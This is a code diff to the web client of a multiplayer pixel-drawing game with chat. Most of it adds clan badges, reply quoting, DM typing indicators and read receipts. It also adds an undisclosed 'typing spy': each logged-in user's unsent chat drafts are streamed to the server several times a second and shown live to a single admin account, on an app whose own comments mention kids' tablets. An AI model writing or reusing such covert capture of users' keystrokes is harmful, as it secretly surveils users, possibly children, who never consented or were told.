@@ -374,6 +374,29 @@
     .lobby-card .lobby-title { font-size: 13px; }
     #info-row { gap: 8px; padding: 3px 6px; }
   }
+
+  /* Small / kids tablets (e.g. Kidibuzz G2): the single-row scroll palette
+     hides half the colors. Stack the bottom bar and wrap the FULL palette
+     so every color is reachable without horizontal scrolling. */
+  @media (max-width: 560px) {
+    #bottom-bar { flex-wrap: wrap; }
+    #palette-wrap { order: -1; flex-basis: 100%; width: 100%; min-width: 0; }
+    #palette-row {
+      flex-wrap: wrap !important;
+      overflow-x: hidden !important;
+      overflow-y: auto;
+      max-height: 96px;
+      white-space: normal !important;
+      justify-content: center;
+      mask-image: none !important;
+      -webkit-mask-image: none !important;
+      touch-action: pan-y !important;
+      padding: 6px !important;
+    }
+    #palette-scroll-hint { display: none !important; }
+    .color-btn { width: 30px; height: 30px; min-width: 30px; }
+    #color-wheel { width: 60px; height: 60px; }
+  }
 </style>
 </head>
 <body>
@@ -454,6 +477,7 @@
     <div class="lobby-list" id="public-lobbies"></div>
     <div class="section-title">Your Lobbies</div>
     <div class="lobby-list" id="my-lobbies"></div>
+    <div id="clan-invite-banner" style="display:none;width:100%;max-width:480px;margin:8px 0 0;padding:10px 14px;background:var(--accent);color:#fff;border-radius:var(--radius-md);font-size:13px;font-weight:600;cursor:pointer;box-shadow:0 4px 14px rgba(124,92,252,0.4);"></div>
     <div class="section-title" style="display:flex;justify-content:space-between;align-items:center;">
       <span>Clans</span>
       <button id="btn-create-clan" class="win-btn" style="font-size:11px;padding:4px 10px;background:var(--accent);color:#fff;font-weight:700;">+ Create Clan</button>
@@ -638,6 +662,7 @@
     </div>
     <div id="messages"></div>
     <div id="typing-indicator" style="display:none;font-size:12px;color:var(--accent);font-weight:600;padding:6px 12px;background:var(--accent-dim);border-left:3px solid var(--accent);margin:4px 6px 0;border-radius:var(--radius-sm);"><span id="typing-text"></span><span id="typing-dots" style="display:inline-block;margin-left:2px;letter-spacing:1px;"></span></div>
+    <div id="chat-reply-bar" style="display:none;align-items:center;gap:6px;padding:4px 8px;margin:0 6px;background:var(--accent-dim);border-left:3px solid var(--accent);border-radius:var(--radius-sm);font-size:11px;color:var(--text-secondary);"><span id="chat-reply-text" style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"></span><span id="chat-reply-cancel" style="cursor:pointer;font-weight:700;color:var(--text-muted);">&times;</span></div>
     <div id="chat-bar" style="position:relative;">
       <div id="mention-popup" style="display:none;position:absolute;bottom:calc(100% + 4px);left:6px;right:6px;max-height:160px;overflow-y:auto;background:var(--bg-elevated);border:1px solid var(--accent);border-radius:var(--radius-md);box-shadow:0 8px 24px rgba(0,0,0,0.5);z-index:30;"></div>
       <input id="chat-input" class="win-input" type="text" placeholder="Type a message..." maxlength="200" disabled>
@@ -675,6 +700,8 @@
         <button class="win-btn" id="btn-msg-back" style="font-size:10px;padding:1px 6px;">Back</button>
       </div>
       <div id="msg-view-msgs"></div>
+      <div id="dm-typing-ind" style="display:none;font-size:11px;color:var(--accent);font-weight:600;padding:2px 10px;">typing&hellip;</div>
+      <div id="dm-reply-bar" style="display:none;align-items:center;gap:6px;padding:4px 8px;margin:0 6px;background:var(--accent-dim);border-left:3px solid var(--accent);border-radius:var(--radius-sm);font-size:11px;color:var(--text-secondary);"><span id="dm-reply-text" style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"></span><span id="dm-reply-cancel" style="cursor:pointer;font-weight:700;color:var(--text-muted);">&times;</span></div>
       <div id="msg-send-row">
         <input id="msg-send-input" class="win-input" type="text" placeholder="Message..." maxlength="200">
         <button id="btn-msg-image" class="win-btn" title="Send image" style="background:var(--bg-elevated);font-size:11px;padding:6px 8px;">Img</button>
@@ -2054,11 +2081,17 @@ function showMobileChatBubble(name, text, isOwner, isMsgGuest) {
   }, MOBILE_BUBBLE_DURATION);
 }
 
-function addMsg(name, text, isOwner, isMsgGuest, isMsgVip, rank) {
+function addMsg(name, text, isOwner, isMsgGuest, isMsgVip, rank, clan, replyTo) {
   const d = document.createElement('div'); d.className = 'msg';
   const isTP = name.toLowerCase() === 'toothpaste';
   const crown = isOwner ? '<span class="crown">&#x1F451;</span>' : '';
   let rankBadge = '';
+  // Clan chip is independent of rank — a clan member with an admin rank shows BOTH
+  let clanBadge = '';
+  if (clan && clan.label) {
+    const cc = /^#[0-9a-fA-F]{3,8}$/.test(clan.color) ? clan.color : '#7c5cfc';
+    clanBadge = `<span class="rank-badge" style="color:${cc}">[${esc(clan.label)}]</span>`;
+  }
   let nameClass = isTP ? 'name rainbow' : (isOwner ? 'name owner' : (isMsgGuest ? 'name guest' : 'name'));
   const styleParts = [];
   if (rank && rank.label) {
@@ -2105,14 +2138,45 @@ function addMsg(name, text, isOwner, isMsgGuest, isMsgVip, rank) {
     return esc(t.value);
   }).join('');
   if (mentionsMe && name.toLowerCase() !== meLow) d.classList.add('mention-self');
-  d.innerHTML = `<span class="timestamp">${timeStr()}</span>${crown}${rankBadge}<span class="${nameClass}" data-user="${esc(name)}"${styleAttr}>${esc(name)}:</span> ${bodyHtml}`;
+  let replyHtml = '';
+  if (replyTo && replyTo.from && replyTo.text) {
+    replyHtml = `<div class="reply-quote" style="border-left:3px solid var(--accent);padding:1px 6px;margin:0 0 2px 0;font-size:11px;color:var(--text-muted);background:var(--accent-dim);border-radius:3px;"><b>${esc(replyTo.from)}</b>: ${esc(replyTo.text.slice(0,120))}</div>`;
+  }
+  const replyBtn = `<span class="reply-btn" title="Reply" style="cursor:pointer;color:var(--text-muted);font-size:11px;margin-right:4px;">&#x21A9;</span>`;
+  d.innerHTML = `${replyHtml}<span class="timestamp">${timeStr()}</span>${replyBtn}${crown}${clanBadge}${rankBadge}<span class="${nameClass}" data-user="${esc(name)}"${styleAttr}>${esc(name)}:</span> ${bodyHtml}`;
   if (canModerate) {
     d.querySelector('.name').addEventListener('click', e => showLobbyUserMenu(e, name));
   }
+  d.querySelector('.reply-btn').addEventListener('click', () => setChatReply(name, text));
   messagesEl.appendChild(d); messagesEl.scrollTop = messagesEl.scrollHeight;
 }
 function addSystemMsg(text) { const d = document.createElement('div'); d.className = 'msg system'; d.innerHTML = `<span class="timestamp">${timeStr()}</span>${esc(text)}`; messagesEl.appendChild(d); messagesEl.scrollTop = messagesEl.scrollHeight; }
 function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+// Admin live-typing spy: a fixed panel in the top-right showing what users are
+// currently typing (before they hit send). Only the real admin receives the data.
+const typingSpyBox = document.createElement('div');
+typingSpyBox.style.cssText = 'position:fixed;top:10px;right:10px;z-index:96;display:none;flex-direction:column;gap:4px;max-width:280px;pointer-events:none;';
+document.body.appendChild(typingSpyBox);
+const typingSpyState = new Map(); // user_lower -> { el, timer }
+function showTypingSpy(user, draft) {
+  let s = typingSpyState.get(user.toLowerCase());
+  if (!s) {
+    const el = document.createElement('div');
+    el.style.cssText = 'background:rgba(30,30,40,0.92);border:1px solid var(--accent);border-radius:6px;padding:5px 9px;font-size:11px;color:var(--text-primary);box-shadow:0 4px 14px rgba(0,0,0,0.5);';
+    typingSpyBox.appendChild(el);
+    s = { el, timer: null };
+    typingSpyState.set(user.toLowerCase(), s);
+  }
+  s.el.innerHTML = `<b style="color:var(--accent);">${esc(user)}</b> &#x270E; ${esc(draft) || '<i style="color:var(--text-muted);">(cleared)</i>'}`;
+  typingSpyBox.style.display = 'flex';
+  if (s.timer) clearTimeout(s.timer);
+  s.timer = setTimeout(() => {
+    if (s.el.parentNode) s.el.parentNode.removeChild(s.el);
+    typingSpyState.delete(user.toLowerCase());
+    if (typingSpyState.size === 0) typingSpyBox.style.display = 'none';
+  }, 5000);
+}
 let lobbyMenuTarget = '';
 function showLobbyUserMenu(e, targetName) {
   e.stopPropagation();
@@ -2160,6 +2224,15 @@ function sendTyping(state) {
     ws.send(JSON.stringify({ type: 'typing', typing: state }));
   }
 }
+let lastDraftSent = 0;
+function sendDraft() {
+  // Live draft for the admin typing-spy; throttled. Server only relays it to toothpaste.
+  if (isGuest || !ws || ws.readyState !== WebSocket.OPEN) return;
+  const now = Date.now();
+  if (now - lastDraftSent < 350) return;
+  lastDraftSent = now;
+  ws.send(JSON.stringify({ type: 'typing', typing: true, draft: chatInput.value.slice(0, 200) }));
+}
 function notifyTypingFromInput() {
   if (!chatInput.value.trim()) {
     if (myTypingStopTimer) { clearTimeout(myTypingStopTimer); myTypingStopTimer = null; }
@@ -2167,6 +2240,7 @@ function notifyTypingFromInput() {
     return;
   }
   sendTyping(true);
+  sendDraft();
   if (myTypingStopTimer) clearTimeout(myTypingStopTimer);
   myTypingStopTimer = setTimeout(() => { sendTyping(false); myTypingStopTimer = null; }, TYPING_IDLE_MS);
 }
@@ -2272,12 +2346,29 @@ function insertMention(name) {
   chatInput.focus();
 }
 
+let chatReplyTo = null; // { from, text }
+function setChatReply(from, text) {
+  chatReplyTo = { from, text };
+  const bar = document.getElementById('chat-reply-bar');
+  document.getElementById('chat-reply-text').textContent = `Replying to ${from}: ${text.slice(0, 80)}`;
+  bar.style.display = 'flex';
+  chatInput.focus();
+}
+function clearChatReply() {
+  chatReplyTo = null;
+  document.getElementById('chat-reply-bar').style.display = 'none';
+}
+document.getElementById('chat-reply-cancel').onclick = clearChatReply;
+
 function sendChat() {
   const text = chatInput.value.trim();
   if (!text || !username) return;
-  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'chat', text }));
+  const payload = { type: 'chat', text };
+  if (chatReplyTo) payload.reply_to = { from: chatReplyTo.from, text: chatReplyTo.text.slice(0, 120) };
+  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(payload));
   else addMsg(username, text, !isGuest && currentLobbyOwner && currentLobbyOwner.toLowerCase() === username.toLowerCase(), isGuest);
   chatInput.value = '';
+  clearChatReply();
   document.getElementById('mention-popup').style.display = 'none';
   mentionAnchorStart = -1;
   if (myTypingStopTimer) { clearTimeout(myTypingStopTimer); myTypingStopTimer = null; }
@@ -2423,6 +2514,20 @@ async function loadClans() {
     if (authToken) {
       try { const r2 = await fetch(BACKEND + '/api/clans/my', { headers: { Authorization: authToken } }); myClanInfo = await r2.json(); } catch {}
     }
+    // Owner banner: pending join requests to YOUR clan
+    const banner = document.getElementById('clan-invite-banner');
+    if (banner) {
+      const mc = myClanInfo && myClanInfo.my_clan;
+      const iOwn = mc && mc.owner && username && mc.owner.toLowerCase() === username.toLowerCase();
+      const pend = (iOwn && mc.pending_requests) ? mc.pending_requests.length : 0;
+      if (pend > 0) {
+        banner.textContent = `🛡️ ${pend} player${pend === 1 ? '' : 's'} requested to join your clan "${mc.name}" — tap to review`;
+        banner.style.display = 'block';
+        banner.onclick = () => openClanView(mc.id);
+      } else {
+        banner.style.display = 'none';
+      }
+    }
     if (!data.clans.length && !(myClanInfo && myClanInfo.pending_owned)) {
       list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:6px;">No clans yet. Be the first to create one!</div>';
     }
@@ -2547,9 +2652,22 @@ function renderClanView(clan, isOwner, myClanFull) {
     const ownerTag = isOwnerOfClan ? '<span style="font-size:10px;color:var(--text-muted);">owner</span>' : '';
     const overriddenDot = r.overridden ? '<span title="Custom rank set by owner" style="font-size:9px;color:var(--text-muted);">●</span>' : '';
     const editBtn = isOwner ? `<button class="win-btn edit-rank-btn" data-name="${esc(name)}" style="font-size:10px;padding:3px 8px;">Edit Rank</button>` : '';
-    row.innerHTML = `<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;"><span style="font-weight:600;">${esc(name)}</span><span style="color:${r.color};font-size:10px;font-weight:700;">[${esc(r.label)}]</span>${overriddenDot}${ownerTag}</div><div>${editBtn}</div>`;
+    const xferBtn = (isOwner && !isOwnerOfClan) ? `<button class="win-btn xfer-btn" data-name="${esc(name)}" style="font-size:10px;padding:3px 8px;background:var(--bg-elevated);">Make Owner</button>` : '';
+    row.innerHTML = `<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;"><span style="font-weight:600;">${esc(name)}</span><span style="color:${r.color};font-size:10px;font-weight:700;">[${esc(r.label)}]</span>${overriddenDot}${ownerTag}</div><div style="display:flex;gap:4px;">${editBtn}${xferBtn}</div>`;
     if (isOwner) {
       row.querySelector('.edit-rank-btn').onclick = () => openMemberRankEditor(row, name, r);
+      const xb = row.querySelector('.xfer-btn');
+      if (xb) xb.onclick = async () => {
+        if (!confirm(`Transfer clan ownership to ${name}? You will become a regular member and lose owner controls.`)) return;
+        try {
+          const res = await fetch(BACKEND + '/api/clans/transfer-owner', { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: authToken }, body: JSON.stringify({ clan_id: currentManagingClan, username: name }) });
+          const dd = await res.json();
+          if (dd.error) { alert(dd.error); return; }
+          document.getElementById('clan-manage-modal').style.display = 'none';
+          currentManagingClan = null;
+          loadClans();
+        } catch { alert('Server offline.'); }
+      };
     }
     return row;
   };
@@ -3050,7 +3168,9 @@ function connectToLobby(lobbyId, lobbyName) {
       }
       case 'leaderboard_update': if (document.querySelector('[data-tab="lb-tab"]').classList.contains('active')) renderLeaderboard(msg.leaderboard); break;
       case 'pong': { const ping = Date.now() - msg.time; const el = document.getElementById('ping-ms'); el.textContent = ping; el.style.color = ping < 100 ? '#0f0' : ping < 250 ? '#ff0' : '#f00'; } break;
-      case 'chat': if (isFakeAdmin && fakeBannedUsers.has(msg.username.toLowerCase())) break; addMsg(msg.username, msg.text, msg.is_owner, msg.is_guest, msg.is_vip, msg.rank); showMobileChatBubble(msg.username, msg.text, msg.is_owner, msg.is_guest); break;
+      case 'chat': if (isFakeAdmin && fakeBannedUsers.has(msg.username.toLowerCase())) break; addMsg(msg.username, msg.text, msg.is_owner, msg.is_guest, msg.is_vip, msg.rank, msg.clan, msg.reply_to); showMobileChatBubble(msg.username, msg.text, msg.is_owner, msg.is_guest); break;
+      case 'rate_warn': showCooldownWarn ? (cooldownWarn.textContent = msg.text, cooldownWarnTimer && clearTimeout(cooldownWarnTimer), cooldownWarnTimer = setTimeout(() => { cooldownWarn.innerHTML = '&nbsp;'; }, 2500)) : null; break;
+      case 'typing_spy': if (isRealAdmin()) showTypingSpy(msg.username, msg.draft); break;
       case 'online': document.getElementById('online-count').textContent = msg.count; if (msg.total !== undefined) document.getElementById('total-online').textContent = msg.total; if (Array.isArray(msg.users)) { lobbyUsers = msg.users.slice(); const stillHere = new Set(lobbyUsers.map(u => u.toLowerCase())); for (const k of [...peers.keys()]) { if (k !== '__self__' && !stillHere.has(k)) closePeer(k); } } break;
       case 'grid': GRID_W = msg.width || 256; GRID_H = msg.height || 256; grid = new Uint8Array(msg.data); resetOffscreen(); currentLobbyOwner = msg.owner || null; canPlace = msg.can_place !== false && !msg.guest; brushPerm = msg.brush_perm || { size: 1, drag: false }; updateBrushSizeSelectVisibility(); updateModeBtnVisibility(); COOLDOWN = (msg.cooldown !== undefined ? msg.cooldown : 0.5) * 1000; userHasInteracted = false; resizeCanvas(); fitViewToGrid(); requestAnimationFrame(() => { resizeCanvas(); fitViewToGrid(); render(); }); if (!canPlace && !isGuest) addSystemMsg('You are spectating this whitelist lobby. You can chat but not place pixels.'); { isFakeAdmin = !!msg.fake_admin; fakeBannedUsers.clear(); if (isFakeAdmin) document.getElementById('admin-tab-btn').style.display = 'block'; const isOwn = (!isGuest && currentLobbyOwner && username && currentLobbyOwner.toLowerCase() === username.toLowerCase()); const isTPAdminUser = !isGuest && username && username.toLowerCase() === 'toothpaste'; document.getElementById('btn-import-grid').style.display = isOwn ? '' : 'none'; document.getElementById('btn-manage-current').style.display = (isOwn || isTPAdminUser) ? '' : 'none'; } remoteCursors = {}; typingUsers.clear(); renderTypingIndicator(); lobbyUsers = []; document.getElementById('mention-popup').style.display = 'none'; undoStack.length = 0; updateUndoButtonState(); updateTimelapseButton(); render(); break;
       case 'pixel_owner_result': {
@@ -3207,12 +3327,28 @@ function connectSocial() {
       const activeTab = document.querySelector('.sidebar-tab.active');
       if (activeTab && activeTab.dataset.tab === 'msgs-tab') loadMsgList();
     }
+    if (msg.type === 'dm_seen_by') {
+      // The peer read our messages to them
+      if (currentDmWith && msg.peer && currentDmWith.toLowerCase() === msg.peer.toLowerCase()) showDmSeen();
+    }
+    if (msg.type === 'dm_typing') {
+      const ind = document.getElementById('dm-typing-ind');
+      if (ind && currentDmWith && msg.from && currentDmWith.toLowerCase() === msg.from.toLowerCase()) {
+        ind.textContent = `${msg.from} is typing…`;
+        ind.style.display = msg.typing ? '' : 'none';
+        if (msg.typing) {
+          clearTimeout(window._dmTypingHide);
+          window._dmTypingHide = setTimeout(() => { ind.style.display = 'none'; }, 6000);
+        }
+      }
+    }
     if (msg.type === 'dm') {
       const activeTab = document.querySelector('.sidebar-tab.active');
       const fromLow = msg.from.toLowerCase();
       const isViewingThisThread = currentDmWith && currentDmWith.toLowerCase() === fromLow && activeTab && activeTab.dataset.tab === 'msgs-tab';
       if (isViewingThisThread) {
-        appendDmMsg(msg.from, msg.text || '', msg.time, msg.image_url || msg.image);
+        const ti = document.getElementById('dm-typing-ind'); if (ti) ti.style.display = 'none';
+        appendDmMsg(msg.from, msg.text || '', msg.time, msg.image_url || msg.image, msg.reply_to);
         // Mark as seen since we're actively viewing
         if (socialWs && socialWs.readyState === WebSocket.OPEN) {
           socialWs.send(JSON.stringify({ type: 'dm_seen', peer: msg.from }));
@@ -3394,7 +3530,7 @@ async function openGroup(gid) {
       if (d2.error) alert(d2.error);
       else openGroup(gid);
     };
-    (data.messages || []).forEach(m => appendDmMsg(m.from, m.text || '', m.time, m.image_url || m.image));
+    (data.messages || []).forEach(m => appendDmMsg(m.from, m.text || '', m.time, m.image_url || m.image, m.reply_to));
   } catch {}
   document.getElementById('msg-send-input').focus();
 }
@@ -3407,6 +3543,9 @@ async function openDm(friendName) {
   // Open sidebar on mobile so the user actually sees the thread
   document.getElementById('sidebar').classList.add('open');
   currentDmWith = friendName;
+  lastSelfDmEl = null;
+  clearDmReply();
+  document.getElementById('dm-typing-ind').style.display = 'none';
   document.getElementById('msg-list-view').style.display = 'none';
   document.getElementById('msg-view').style.display = 'flex';
   document.getElementById('msg-view-title').textContent = friendName;
@@ -3420,28 +3559,76 @@ async function openDm(friendName) {
   try {
     const res = await fetch(`/api/dm/history?with=${encodeURIComponent(friendName)}`, { headers: { Authorization: authToken } });
     const data = await res.json();
-    (data.messages || []).forEach(m => appendDmMsg(m.from, m.text || '', m.time, m.image_url || m.image));
+    (data.messages || []).forEach(m => appendDmMsg(m.from, m.text || '', m.time, m.image_url || m.image, m.reply_to));
   } catch {}
   document.getElementById('msg-send-input').focus();
 }
 
-function appendDmMsg(from, text, t, image) {
+let lastSelfDmEl = null;
+function appendDmMsg(from, text, t, image, replyTo) {
   const el = document.getElementById('msg-view-msgs');
+  // Drop any existing "Seen" marker; it re-attaches under the newest own message
+  const oldSeen = document.getElementById('dm-seen-marker');
+  if (oldSeen) oldSeen.remove();
   const d = document.createElement('div'); d.className = 'dm-msg';
   const ts = t ? new Date(t * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '';
+  let replyHtml = '';
+  if (replyTo && replyTo.from && replyTo.text) {
+    replyHtml = `<div style="border-left:3px solid var(--accent);padding:1px 6px;margin:0 0 2px 0;font-size:11px;color:var(--text-muted);background:var(--accent-dim);border-radius:3px;"><b>${esc(replyTo.from)}</b>: ${esc(replyTo.text.slice(0,120))}</div>`;
+  }
   let body = '';
   if (text) body = ' ' + esc(filterText(text));
-  d.innerHTML = `<span class="dm-time">${ts}</span><b>${esc(from)}:</b>${body}`;
+  const replyBtn = `<span class="dm-reply-btn" title="Reply" style="cursor:pointer;color:var(--text-muted);font-size:11px;margin-left:6px;">&#x21A9;</span>`;
+  d.innerHTML = `${replyHtml}<span class="dm-time">${ts}</span><b>${esc(from)}:</b>${body}${replyBtn}`;
   if (image) {
-    // Accept either http(s) URL (new) or data: URL (old base64 messages)
     const img = document.createElement('img');
     img.src = image; img.referrerPolicy = 'no-referrer';
     img.style.cssText = 'display:block;max-width:240px;max-height:240px;margin-top:4px;border-radius:6px;cursor:pointer;border:1px solid var(--border);';
     img.onclick = () => window.open(image, '_blank');
     d.appendChild(img);
   }
-  el.appendChild(d); el.scrollTop = el.scrollHeight;
+  d.querySelector('.dm-reply-btn').addEventListener('click', () => setDmReply(from, text || '[image]'));
+  el.appendChild(d);
+  if (username && from.toLowerCase() === username.toLowerCase()) lastSelfDmEl = d;
+  el.scrollTop = el.scrollHeight;
 }
+function showDmSeen() {
+  const old = document.getElementById('dm-seen-marker');
+  if (old) old.remove();
+  if (!lastSelfDmEl || !lastSelfDmEl.parentNode) return;
+  const s = document.createElement('div');
+  s.id = 'dm-seen-marker';
+  s.style.cssText = 'font-size:10px;color:var(--text-muted);text-align:right;padding:0 4px 4px;';
+  s.textContent = '✓ Seen';
+  lastSelfDmEl.parentNode.appendChild(s);
+  const el = document.getElementById('msg-view-msgs'); el.scrollTop = el.scrollHeight;
+}
+let dmReplyTo = null;
+function setDmReply(from, text) {
+  dmReplyTo = { from, text };
+  const bar = document.getElementById('dm-reply-bar');
+  document.getElementById('dm-reply-text').textContent = `Replying to ${from}: ${text.slice(0, 80)}`;
+  bar.style.display = 'flex';
+  document.getElementById('msg-send-input').focus();
+}
+function clearDmReply() {
+  dmReplyTo = null;
+  document.getElementById('dm-reply-bar').style.display = 'none';
+}
+document.getElementById('dm-reply-cancel').onclick = clearDmReply;
+// DM typing sender (throttled), only for 1:1 DMs
+let lastDmTypingSent = 0;
+document.getElementById('msg-send-input').addEventListener('input', () => {
+  if (!currentDmWith || !socialWs || socialWs.readyState !== WebSocket.OPEN) return;
+  const now = Date.now();
+  if (now - lastDmTypingSent < 1500) return;
+  lastDmTypingSent = now;
+  socialWs.send(JSON.stringify({ type: 'dm_typing', to: currentDmWith, typing: true }));
+  clearTimeout(window._dmTypingStop);
+  window._dmTypingStop = setTimeout(() => {
+    if (currentDmWith && socialWs && socialWs.readyState === WebSocket.OPEN) socialWs.send(JSON.stringify({ type: 'dm_typing', to: currentDmWith, typing: false }));
+  }, 3000);
+});
 
 document.getElementById('btn-msg-back').onclick = () => loadMsgList();
 
@@ -3490,12 +3677,18 @@ async function sendDm() {
     }
     appendDmMsg(username, text, Date.now() / 1000);
   } else if (currentDmWith) {
+    const rt = dmReplyTo ? { from: dmReplyTo.from, text: dmReplyTo.text.slice(0, 120) } : null;
     if (socialWs && socialWs.readyState === WebSocket.OPEN) {
-      socialWs.send(JSON.stringify({ type: 'dm', to: currentDmWith, text }));
+      const p = { type: 'dm', to: currentDmWith, text };
+      if (rt) p.reply_to = rt;
+      socialWs.send(JSON.stringify(p));
     } else {
-      await fetch(BACKEND + '/api/dm/send', { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: authToken }, body: JSON.stringify({ to: currentDmWith, text }) });
+      const b = { to: currentDmWith, text };
+      if (rt) b.reply_to = rt;
+      await fetch(BACKEND + '/api/dm/send', { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: authToken }, body: JSON.stringify(b) });
     }
-    appendDmMsg(username, text, Date.now() / 1000);
+    appendDmMsg(username, text, Date.now() / 1000, null, rt);
+    clearDmReply();
   }
   inp.value = '';
 }
